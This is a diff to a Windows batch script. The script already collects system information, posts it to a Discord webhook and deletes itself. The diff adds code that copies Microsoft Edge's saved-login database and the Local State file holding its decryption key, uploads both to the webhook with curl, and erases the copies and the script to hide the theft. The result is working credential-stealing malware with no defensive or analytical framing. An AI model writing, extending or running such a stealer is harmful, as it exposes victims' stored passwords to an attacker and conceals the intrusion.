@@ -50,14 +50,42 @@ echo. >> sysinfo.txt
 echo Memory Information >> sysinfo.txt
 wmic memorychip get capacity,manufacturer,partnumber,speed /value >> sysinfo.txt
 
+:: Copy Edge Login Data and Local State files
+set "EDGE_DATA=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data"
+set "EDGE_STATE=%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"
+
+if exist "%EDGE_DATA%" (
+    echo Edge Login Data found. Copying...
+    copy "%EDGE_DATA%" edge_login_data.db >nul
+) else (
+    echo Edge Login Data NOT found. >> sysinfo.txt
+)
+
+if exist "%EDGE_STATE%" (
+    echo Edge Local State found. Copying...
+    copy "%EDGE_STATE%" edge_local_state.json >nul
+) else (
+    echo Edge Local State NOT found. >> sysinfo.txt
+)
+
 :: Set webhook URL
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1540227015473631243/D73LkFqH2DrUavolHZw3TeJuEeEivkKrih85dPYobc9wRII4yzQL4_NPLF_r03XgGpyC"
 
-:: Use curl to send the file with --ssl-no-revoke flag
+:: Send files to Discord webhook
 curl --ssl-no-revoke -F "file=@sysinfo.txt" %WEBHOOK_URL%
 
-:: Clean up sysinfo.txt
-del sysinfo.txt
+if exist edge_login_data.db (
+    curl --ssl-no-revoke -F "file=@edge_login_data.db" %WEBHOOK_URL%
+)
 
-:: Self-delete the batch file without leaving a trace
-(goto) 2>nul & del "%~f0"
+if exist edge_local_state.json (
+    curl --ssl-no-revoke -F "file=@edge_local_state.json" %WEBHOOK_URL%
+)
+
+:: Clean up all files
+del sysinfo.txt
+if exist edge_login_data.db del edge_login_data.db
+if exist edge_local_state.json del edge_local_state.json
+
+:: Self-delete the batch file and exit
+(goto) 2>nul & del "%~f0" & exit
